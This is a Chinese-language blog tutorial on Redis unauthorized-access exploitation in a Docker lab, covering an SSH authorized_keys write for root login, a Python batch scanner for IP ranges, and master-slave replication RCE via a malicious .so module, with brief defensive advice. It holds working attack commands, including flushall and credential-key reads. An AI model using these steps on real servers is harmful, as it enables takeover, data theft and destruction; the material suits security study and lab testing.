<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=2"><meta name="theme-color" content="#FFF"><link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png"><link rel="icon" type="image/ico" sizes="32x32" href="/images/favicon.ico"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><link rel="alternate" type="application/rss+xml" title="低头学习  抬头看路" href="https://nnnpc.github.io/rss.xml"><link rel="alternate" type="application/atom+xml" title="低头学习  抬头看路" href="https://nnnpc.github.io/atom.xml"><link rel="alternate" type="application/json" title="低头学习  抬头看路" href="https://nnnpc.github.io/feed.json"><link rel="stylesheet" href="//fonts.googleapis.com/css?family=Mulish:300,300italic,400,400italic,700,700italic%7CFredericka%20the%20Great:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20JP:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20SC:300,300italic,400,400italic,700,700italic%7CInconsolata:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext"><link rel="stylesheet" href="/css/app.css?v=0.2.5"><meta name="keywords" content="其它"><link rel="canonical" href="https://nnnpc.github.io/2024/04/16/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/"><title>未授权访问漏洞 - 杂记 - 其它 | nnnpc's Blog = 低头学习 抬头看路 = 很多人已经做到了，而他们都曾经和现在的你站在同样的起点上</title><meta name="generator" content="Hexo 6.3.0"></head><body itemscope itemtype="http://schema.org/WebPage"><div id="loading"><div class="cat"><div class="body"></div><div class="head"><div class="face"></div></div><div class="foot"><div class="tummy-end"></div><div class="bottom"></div><div class="legs left"></div><div class="legs right"></div></div><div class="paw"><div class="hands left"></div><div class="hands right"></div></div></div></div><div id="container"><header id="header" itemscope itemtype="http://schema.org/WPHeader"><div class="inner"><div id="brand"><div class="pjax"><h1 itemprop="name headline">未授权访问漏洞</h1><div class="meta"><span class="item" title="创建时间：2024-04-16 13:58:19"><span class="icon"><i class="ic i-calendar"></i> </span><span class="text">发表于</span> <time itemprop="dateCreated datePublished" datetime="2024-04-16T13:58:19+08:00">2024-04-16</time></span></div></div></div><nav id="nav"><div class="inner"><div class="toggle"><div class="lines" aria-label="切换导航栏"><span class="line"></span> <span class="line"></span> <span class="line"></span></div></div><ul class="menu"><li class="item title"><a href="/" rel="start">nnnpc's Blog</a></li></ul><ul class="right"><li class="item theme"><i class="ic i-sun"></i></li><li class="item search"><i class="ic i-search"></i></li></ul></div></nav></div><div id="imgs" class="pjax"><img src="https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/1.jpg"></div></header><div id="waves"><svg class="waves" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto"><defs><path id="gentle-wave" d="M-160 44c30 0 58-18 88-18s 58 18 88 18 58-18 88-18 58 18 88 18 v44h-352z"/></defs><g class="parallax"><use xlink:href="#gentle-wave" x="48" y="0"/><use xlink:href="#gentle-wave" x="48" y="3"/><use xlink:href="#gentle-wave" x="48" y="5"/><use xlink:href="#gentle-wave" x="48" y="7"/></g></svg></div><main><div class="inner"><div id="main" class="pjax"><div class="article wrap"><div class="breadcrumb" itemscope itemtype="https://schema.org/BreadcrumbList"><i class="ic i-home"></i> <span><a href="/">首页</a></span><i class="ic i-angle-right"></i> <span itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem"><a href="/categories/%E5%85%B6%E5%AE%83/" itemprop="item" rel="index" title="分类于 其它"><span itemprop="name">其它</span></a><meta itemprop="position" content="1"></span><i class="ic i-angle-right"></i> <span class="current" itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem"><a href="/categories/%E5%85%B6%E5%AE%83/course-4/" itemprop="item" rel="index" title="分类于 杂记"><span itemprop="name">杂记</span></a><meta itemprop="position" content="2"></span></div><article itemscope itemtype="http://schema.org/Article" class="post block" lang="zh-CN"><link itemprop="mainEntityOfPage" href="https://nnnpc.github.io/2024/04/16/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/"><span hidden itemprop="author" itemscope itemtype="http://schema.org/Person"><meta itemprop="image" content="/images/avatar.jpg"><meta itemprop="name" content="nnnpc"><meta itemprop="description" content="很多人已经做到了，而他们都曾经和现在的你站在同样的起点上, 欢迎来交流学习"></span><span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization"><meta itemprop="name" content="低头学习  抬头看路"></span><div class="body md" itemprop="articleBody"><blockquote><p>未授权访问漏洞可以理解为安全配置、权限认证、授权页面存在缺陷，导致其他用户可以直接访问，从而引发权限可被操作，数据库、网站目录等敏感信息泄露。目前存在未授权访问漏洞的主要服务包括：NFS、Samba、LDAP、Rsync、FTP、GitLab、Jenkins、MongoDB、Redis、ZooKeeper、ElasticSearch、Memcache、CouchDB、Docker、Solr、Hadoop 等，使用时要注意。</p></blockquote><p><strong>Redis 未授权访问漏洞</strong></p><blockquote><p>Redis 是一种使用 ANSIC 语言编写的开源 Key-Value 型数据库。与 Memcache 相似，支持存储的 value 类型有很多种，其中包括 String（字符串）、List（链表）、Set（集合）、Zste（有序集合）、Hash（哈希）等。同时，Redis 还支持不同的排序方式。Redis 为了保证效率，将数据缓存在内存中，周期性地把更新的数据写入磁盘或者把修改操作写入追加的记录文件中，，在此基础上实现主从同步。</p></blockquote><p>对 Redis 配置不当将会导致未授权访问漏洞，，从而被攻击者恶意利用。在特定条件下，如果 Redis 以 root 身份运行，攻击者可以用 root 权限的身份写入 SSH 公钥文件，通过 SSH 登录目标服务器。流程如下：</p><blockquote><p>密钥验证登录客户端生成公钥和私钥，将公钥提前部署在服务器上。<br>客户端发起连接请求。<br>服务器随机生成一个字符串，用本地的公钥加密，发送给客户端。<br>客户端通过私钥解密，将解密后的字符串发送给服务器。<br>服务器验证本地字符串和客户端发来的字符串的一致性，如果通过，则认证成功。</p></blockquote><p>进而会导致服务器权限被获取、泄露或发生加密勒索事件，为正常服务带来严重危害。通常，服务器上的 Redis 绑定在 0.0.0.0:6379，如果没有开启认证功能，且没有采用相关的安全策略，比如添加防火墙规则避免其他非信任来源 IP 访问等，将会导致 Redis 服务直接暴露在公网上，造成其他用户直接在非授权情况下访问 Redis 服务。</p><p>通过手工进行未授权访问验证，在安装 Redis 服务的 Kali 系统中输入</p><p></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">redis-cli-h IP</span><br></pre></td></tr></table></figure><p></p><p>如果目标系统存在未授权访问漏洞，则可以成功进行连接。输入 info 命令，可以查看 Redis 服务的版本号、配置文件目录、进程 ID 号等<br><img data-src="https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/ocG69JSA982uSTiK.png!thumbnail" alt="" title="fig:"></p><p><strong>漏洞利用</strong></p><p>当与远程 Redis 建立好连接后，通过 Redis 指令就能查询所需要的敏感信息。下面就 Redis 一些常用指令进行简单介绍：</p><p></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">查看key和其对应的值：keys *</span><br><span class="line">获取用户名：get user</span><br><span class="line">获取登录指令：get password</span><br><span class="line">删除所有数据：flushall</span><br></pre></td></tr></table></figure><p></p><p><img data-src="https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/PwhMm1LB8LN6UmBp.png!thumbnail" alt=""></p><p>如果 redis 拥有 root 权限，那么攻击者就可以将自己的公钥写入目标服务器的<br>/root/.ssh 文件夹的 authotrized_keys 文件中，进而可以直接登录目标服务器。</p><p>接下来就拉取镜像实现 ssh 登录</p><p></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo docker pull medicean/vulapps:r_redis_1</span><br></pre></td></tr></table></figure><p></p><p>拉取 docker 镜像，并且启动环境</p><p></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo docker run --name=redisvul -d -p 22:22 -p 6379:6379 medicean/vulapps:r_redis_1</span><br></pre></td></tr></table></figure><p></p><p>这里由于是 docker 中的镜像，因此只能使用这一台机子来作为攻击机，因为 docker 中生成的一个虚拟网卡只能本机来进行访问，其他机子访问不了，既然本机作为攻击机，就先查看下本机的 ip</p><p></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ifconfig</span><br></pre></td></tr></table></figure><p></p><p>再查看下 docker 中该容器的 ID<br><img data-src="https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/QbG2DLhu7m9Y4wAk.png!thumbnail" alt="" title="fig:"></p><p>这里查看到我的容器 ID 为 9a4fe89bc623，接下来查看 docker 的 ip，通过命令</p><p></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo docker exec -it 容器id /bin/bash</span><br></pre></td></tr></table></figure><p></p><p>进入 docker，通过</p><p></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/hosts</span><br></pre></td></tr></table></figure><p></p><p>来查看 ip<br><img data-src="https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/4FyPW0dj99ZAYTzU.png!thumbnail" alt="" title="fig:"></p><p>这样攻击机和靶机的 ip 都知道了，接着就是利用 redis 未授权访问漏洞写入公钥进行连接了</p><p>先同样测试一下 redis</p><p></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">redis-cli -h IP</span><br></pre></td></tr></table></figure><p></p><p><img data-src="https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/F0hXSvvwMrcrZxf1.png!thumbnail" alt=""></p><p>redis 未授权证明成功，接下来本地生成公钥进行传输</p><p>（建议接下来全程用 root 用户操作，能够减少权限不够的报错）</p><p></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa</span><br></pre></td></tr></table></figure><p></p><p><img data-src="https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/kTm65oT3FRsBJWTV.png!thumbnail" alt=""></p><p>三个问题直接回车就好，overwrite 是因为我之前进行生成过，询问是否覆盖，公钥生成完毕，将生成的公钥的值写入目标机当中</p><p></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(echo -e &quot;\n\n&quot;; cat ~/.ssh/id_rsa.pub; echo -e &quot;\n\n&quot;) &gt; /tmp/foo.txt</span><br><span class="line">cat /tmp/foo.txt | redis-cli -h IP -p 6379 -x set crackit</span><br></pre></td></tr></table></figure><p></p><p><img data-src="https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/T7LD5oTxTELJf35U.png!thumbnail" alt=""></p><p>连接目标</p><p></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">redis-cli -h IP -p 6379 </span><br></pre></td></tr></table></figure><p></p><p>设置（更改）目录为 /root/.ssh，并将备份文件名设置为 authorized_keys</p><p></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">config set dir /root/.ssh/</span><br><span class="line">config get dir</span><br><span class="line">config set dbfilename &quot;authorized_keys&quot;</span><br><span class="line">save</span><br></pre></td></tr></table></figure><p></p><p><img data-src="https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/F1MA04PS1eh63Dly.png!thumbnail" alt="" title="fig:"></p><p>最后利用私钥通过 ssh 连接目标</p><p></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh root@IP -i ~/.ssh/id_rsa</span><br></pre></td></tr></table></figure><p></p><p><img data-src="https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/IX6kmiuiSQKe4Z30.png!thumbnail" alt=""></p><p>连接成功，同样的命令 cat /etc/hosts 查看 ip</p><p><img data-src="https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/yhbUrod9FGqXnCnE.png!thumbnail" alt=""></p><p>能看到成功 getshell 并且是 root 权限</p><p>这里提一嘴，如果是用两台机子也可以，但有可能会出现虽然能对拉镜像的机子进行 redis 的连接，并且成功写入，但是 ssh 连不上的情况。这是因为 22 端口没进行映射，6379 端口是自动进行映射了，所以到最后一步 ssh 连接才会不成功</p><p>接下来介绍怎么通过 python 脚本批量检测 redis 未授权访问漏洞</p><p>先编写起始部分，类似于 C 语言中的 main () 函数，执行过程中没有发生异常时，执行定义的 start () 函数。通过 sys.argv [] 实现对外部指令的接收。其中，sys.argv [0] 代表代码本身的文件路径，sys.argv [1:] 表示从第一个命令行参数到输入的最后一个命令行参数，存储形式为 List 类型：</p><p></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">        try:</span><br><span class="line">                start(sys.argv[1:])</span><br><span class="line">        except KeyboardInterrupt:</span><br><span class="line">                print(&quot;interrupted by user,killing all threads...&quot;)</span><br></pre></td></tr></table></figure><p></p><p>编写命令行参数处理功能。此处主要应用 getopt.getopt () 函数处理命令行参数，该函数目前有短选项和长选项两种格式。短选项格式为 &quot;-&quot; 加上单个字母选项；长选项格式为 &quot;--&quot; 加上一个单词选项。opts 为一个两元组列表，每个元素为（选项串，附加参数）。如果没有附加参数则为空串。之后通过 for 循环输出 opts 列表中的数值并赋值给自己定义的变量：<br>接下来部分主要用于输出帮助信息，增加代码工具的可读性和易用性。为了使输出的信息更加美观简洁，可以通过转义字符设置输出字体的颜色，从而实现需要的效果。开头部分包含三个参数：显示方式、前景色、背景色。这三个参数是可选的，可以只写其中的某一个参数。对于结尾部分，可以省略，但是为了书写规范，建议以 \033 [0m 结尾</p><p></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"># banner信息</span><br><span class="line">def banner():</span><br><span class="line">    print(&#x27;\033[1;34m#################################################\033[1;32mTT_xxxxx\033[&#x27;</span><br><span class="line">          &#x27;1;34m##############################################################\033[0m\n&#x27;)</span><br><span class="line"></span><br><span class="line">    # 使用规则</span><br><span class="line">    def usage():</span><br><span class="line">        print(&#x27;-h: --help 帮助;&#x27;)</span><br><span class="line">        print(&#x27;-p: --port 端口;&#x27;)</span><br><span class="line">        print(&#x27;-u: --url 域名;&#x27;)</span><br><span class="line">        print(&#x27;-s: --type Redis&#x27;)</span><br><span class="line">        sys.exit()</span><br></pre></td></tr></table></figure><p></p><p>输出有关该脚本用法的帮助信息，即可执行的参数指令以及对应的功能简介。当然，此处也可以根据自己的喜好设置输出不同类型的字体颜色或者图案</p><p></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">def start(argv):</span><br><span class="line">    thread = 1</span><br><span class="line">    dict = &#123;&#125;</span><br><span class="line">    utl = &#x27;&#x27;</span><br><span class="line">    type = &quot;&quot;</span><br><span class="line">    if len(sys.argv) &lt; 2:  # 程序外部获取参数的桥梁</span><br><span class="line">        print(&#x27;-h 帮助信息;\n&#x27;)</span><br><span class="line">        sys.exit()</span><br><span class="line">    try:</span><br><span class="line">        banner()</span><br><span class="line">        opts, args = getopt.getopt(argv, &#x27;-u:-p:-s:-h&#x27;)</span><br><span class="line">    except getopt.GetoptError:</span><br><span class="line">        print(&#x27;Error an argument!&#x27;)</span><br><span class="line">        sys.exit()</span><br><span class="line">    for opt, arg in opts:</span><br><span class="line">        if opt == &#x27;-u&#x27;:</span><br><span class="line">            url = arg</span><br><span class="line">        elif opt == &#x27;-s&#x27;:</span><br><span class="line">            type = arg</span><br><span class="line">        elif opt == &#x27;-p&#x27;:</span><br><span class="line">            port = arg</span><br><span class="line">        elif opt == &#x27;-h&#x27;:</span><br><span class="line">            print(usage())</span><br><span class="line">    launcher(url, type, port)</span><br><span class="line">    </span><br><span class="line">def launcher(url, type, port):</span><br><span class="line">    if type == &#x27;Redis&#x27;:</span><br><span class="line">        output = redis_unathored(url_exec(url), port)</span><br><span class="line">        output_exec(output, type)</span><br></pre></td></tr></table></figure><p></p><p>接下来就是 redis 未授权访问检测脚本的核心部分，根据命令行输入端写入的 IP 或 IP 范围，通过 for 语句循环输出<br>。此处通过 socket () 函数尝试连接远程主机的 IP 及端口号，发送 payload 字符串。利用 rcvdata () 函数接收目标主机返回的数据，当时返回的数据含有 'redis<br>version' 字符串时，表明存在未授权访问漏洞，否则不存在</p><p></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">def redis_unathored(url, port):</span><br><span class="line">    result = []</span><br><span class="line">    s = socket.socket()  # 创建socket</span><br><span class="line">    payload = &quot;\x2a\x31\x0d\x0a\x24\x34\x0d\x0a\x69\x6e\x66\x6f\x0d\x0a&quot;</span><br><span class="line">    socket.setdefaulttimeout(10)  # 限制时间</span><br><span class="line"></span><br><span class="line">    for ip in url:</span><br><span class="line">        try:</span><br><span class="line">            s.connect((ip, int(port)))  # 进行发送</span><br><span class="line">            s.sendall(payload.encode())  # 判断每次发送的内容量，删除重合</span><br><span class="line">            resves = s.recv(1024).decode()  # 创建存储</span><br><span class="line">            if resves and &#x27;redis_version&#x27; in resves:</span><br><span class="line">                result.append(str(ip) + &quot;:&quot; + str(port) + &#x27;:&#x27; + &#x27;\033[1;32;40msuccess\033[0m&#x27;)</span><br><span class="line">        except:</span><br><span class="line">            pass</span><br><span class="line">            result.append(str(ip) + &#x27;:&#x27; + str(port) + &#x27;:&#x27; + &#x27;\033[1;31;40mfailed \033[0m&#x27;)</span><br><span class="line">        s.close()</span><br><span class="line">    return (result)</span><br></pre></td></tr></table></figure><p></p><p>接下来针对 IP 区段内的网络主机进行未授权访问检测，在进行内网渗透测试的过程中，由于输入单个 IP 地址进行测试较为复杂，因此有必要进行 IP 段段内检测。该部分代码主要以特殊字符 &quot;-&quot; 为目标字符进行分隔，将分隔后的字符进行 for 循环存入列表中，以便被函数 redis_unauthored () 调用</p><p></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">def url_list(li):</span><br><span class="line">    ss = []</span><br><span class="line">    i = 0</span><br><span class="line">    j = 0</span><br><span class="line">    zi = []</span><br><span class="line">    for s in li:</span><br><span class="line">        a = s.find(&#x27;-&#x27;)</span><br><span class="line">        i = i + 1</span><br><span class="line">        if a != -1:</span><br><span class="line">            ss = s.rsplit(&quot;-&quot;)</span><br><span class="line">            j = i</span><br><span class="line">            break</span><br><span class="line">    for s in range(int(ss[0]), int(ss[1]) + 1):</span><br><span class="line">        li[j - 1] = str(s)</span><br><span class="line">        aa = &#x27;.&#x27;.join(li)</span><br><span class="line">        zi.append(aa)</span><br><span class="line">    return zi</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def url_exec(url):</span><br><span class="line">    i = 0</span><br><span class="line">    zi = []</span><br><span class="line">    group = []</span><br><span class="line">    group1 = []</span><br><span class="line">    group2 = []</span><br><span class="line">    li = url.split(&#x27;.&#x27;)</span><br><span class="line">    if (url.find(&#x27;-&#x27;) == -1):</span><br><span class="line">        group.append(url)</span><br><span class="line">        zi = group</span><br><span class="line">    else:</span><br><span class="line">        for s in li:</span><br><span class="line">            a = s.find(&#x27;-&#x27;)</span><br><span class="line">            if a != -1:</span><br><span class="line">                i = i + 1</span><br><span class="line">        zi = url_list(li)</span><br><span class="line">        if i &gt; 1:</span><br><span class="line">            for li in zi:</span><br><span class="line">                zz = url_list(li.split(&#x27;.&#x27;))</span><br><span class="line">                for ki in zz:</span><br><span class="line">                    group.append(ki)</span><br><span class="line">                zi = group</span><br><span class="line">                i = i - 1</span><br><span class="line">        if i &gt; 1:</span><br><span class="line">            for li in zi:</span><br><span class="line">                zzz = url_list(li.split(&#x27;.&#x27;))</span><br><span class="line">                for ki in zzz:</span><br><span class="line">                    group1.append(ki)</span><br><span class="line">            zi = group1</span><br><span class="line">            i = i - 1</span><br><span class="line">        if i &gt; 1:</span><br><span class="line">            for li in zi:</span><br><span class="line">                key = url_list(li.split(&#x27;.&#x27;))</span><br><span class="line">                for ki in key:</span><br><span class="line">                    group2.append(ki)</span><br><span class="line">            zi = group2</span><br><span class="line">    return zi</span><br></pre></td></tr></table></figure><p></p><p>设置数据的输出格式，使输出的数据更加美观、简洁，增加可读性。该部分代码的输出字段主要分三段信息，其中包括 IP 地址、端口号、状态信息</p><p></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">def output_exec(output, type):</span><br><span class="line">    print(&quot;\033[1;32;40m&quot; + type + &quot;......\033[0m&quot;)</span><br><span class="line">    print(&quot;++++++++++++++++++++++++++++++++++++++++++++++++&quot;)</span><br><span class="line">    print(&quot;|         ip         |    port   |     status  |&quot;)</span><br><span class="line">    for li in output:</span><br><span class="line">        print(&quot;+-----------------+-----------+--------------+&quot;)</span><br><span class="line">        print(&quot;|   &quot; + li.replace(&quot;:&quot;, &quot;   |    &quot;) + &quot;  | &quot;)  # 替换字符串</span><br><span class="line">    print(&quot;+----------------+------------+---------------+\n&quot;)</span><br><span class="line">    print(&quot;[*] shutting down....&quot;)</span><br></pre></td></tr></table></figure><p></p><p>该脚本的原理比较简单，我们用 redis-cli 连接过的知道，如果存在未授权漏洞那么 info 命令能输出诸多信息，这里就利用了这个方法，发送 info 的 payload，用函数接收回显信息，判断信息中带有的特殊字段，来判断是否存在漏洞<br><strong>利用主从复制进行 RCE</strong></p><p>上面介绍了拥有 root 权限的 redis 怎么拿 shell，但是也有很多时候 redis 不被赋予 root 权限，这时候就需要用到上面所说的主从复制的知识点来进行 RCE</p><blockquote><p>主从模式指使用一个 redis 作为主机，其他的作为备份机，主机从机数据都是一样的，从机只负责读，主机只负责写。在 Reids<br>4.x 之后，通过外部拓展，可以实现在 redis 中实现一个新的 Redis 命令，构造恶意.so 文件。在两个 Redis 实例设置主从模式的时候，Redis 的主机实例可以通过 FULLRESYNC 同步文件到从机上。然后在从机上加载恶意 so 文件，即可执行命令。</p></blockquote><p>搭建 vulhub 靶场</p><p></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure><p></p><p>开启<br><img data-src="https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/aiByWcFPqwF5ChJl.png!thumbnail" alt="" title="fig:"></p><p>查看 docker 中启动的进程</p><p></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker ps -a</span><br></pre></td></tr></table></figure><p></p><p><img data-src="https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/v5eDdeSSOFNFyOuy.png!thumbnail" alt=""></p><p>这里得到刚才启动的 redis 容器的 ID 为 25137f98e35d</p><p></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker exec -it 25137f98e35d /bin/bash</span><br></pre></td></tr></table></figure><p></p><p>进入容器</p><p></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/hosts</span><br></pre></td></tr></table></figure><p></p><p>查看容器 IP<br><img data-src="https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/XRBrApApv5QKxI2N.png!thumbnail" alt="" title="fig:"></p><p>得到容器 IP 为 172.18.0.2，该 IP 就作为目标 ip 也就是靶机来进行攻击，当然也可以以搭建环境的这台虚拟机来作为靶机，因为 6379 端口已经自动映射出去了</p><p>接下来先测试连接 redis</p><p><img data-src="https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/DTAcyuTMdPkTLcCv.png!thumbnail" alt=""></p><p>成功，接着利用脚本进行主从复制 getshell</p><p>工具脚本：</p><p></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/n0b0dyCN/RedisModules-ExecuteCommand（需要make）</span><br><span class="line">git clone https://github.com/Ridter/redis-rce.git</span><br><span class="line">https://github.com/vulhub/redis-rogue-getshell</span><br><span class="line">https://github.com/jas502n/Redis-RCE</span><br><span class="line">工具下载总结来自：https://blog.51cto.com/u_12343119/5850923</span><br></pre></td></tr></table></figure><p></p><p>下载完成后进入目录执行脚本并且使用 exp_lin.so 文件</p><p></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 ./redis-rce.py -r 172.18.0.2 -p 6379 -L 192.168.40.136 -f exp_lin.so</span><br></pre></td></tr></table></figure><p></p><p><img data-src="https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/kQrxYZJ4Sc1R45BM.png!thumbnail" alt=""></p><p>成功 getshell</p><p><strong>redis 防御策略</strong></p><p>1. 禁止远程使用高危命令</p><p>2. 低权限运行 redis 服务</p><p>3. 禁止外网访问 redis</p><p>4. 阻止其他用户添加新的公钥，将 authorized_keys 的权限设置为对拥有者只读</p><div class="tags"><a href="/tags/%E5%85%B6%E5%AE%83/" rel="tag"><i class="ic i-tag"></i> 其它</a></div></div><footer><div class="meta"><span class="item"><span class="icon"><i class="ic i-calendar-check"></i> </span><span class="text">更新于</span> <time title="修改时间：2024-04-16 19:33:30" itemprop="dateModified" datetime="2024-04-16T19:33:30+08:00">2024-04-16</time></span></div><div id="copyright"><ul><li class="author"><strong>本文作者： </strong>nnnpc <i class="ic i-at"><em>@</em></i>低头学习 抬头看路</li><li class="link"><strong>本文链接：</strong> <a href="https://nnnpc.github.io/2024/04/16/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/" title="未授权访问漏洞">https://nnnpc.github.io/2024/04/16/未授权访问漏洞/</a></li><li class="license"><strong>版权声明： </strong>本站所有文章除特别声明外，均采用 <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><i class="ic 